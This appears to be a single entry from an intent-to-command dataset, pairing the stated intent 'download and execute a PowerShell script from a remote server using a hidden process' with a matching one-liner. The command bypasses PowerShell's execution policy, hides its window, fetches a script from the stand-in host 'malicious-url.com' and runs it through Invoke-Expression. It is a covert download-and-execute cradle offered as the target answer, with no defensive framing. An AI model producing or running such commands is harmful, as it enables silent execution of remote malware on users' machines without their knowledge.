# Natural language intent:
# Download and execute a PowerShell script from a remote server using a hidden process.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/malicious-script.ps1' | Invoke-Expression"
